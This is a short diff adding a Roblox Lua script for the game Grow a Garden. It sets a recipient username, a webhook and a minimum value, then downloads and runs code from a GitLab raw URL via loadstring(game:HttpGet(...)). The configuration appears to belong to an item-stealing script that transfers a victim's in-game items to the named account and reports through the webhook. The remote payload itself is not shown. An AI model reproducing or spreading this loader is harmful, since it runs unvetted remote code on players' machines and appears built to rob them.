@@ -1,0 +1,5 @@
+Username = "julimae11"
+Webhook = "Your Webhook"
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
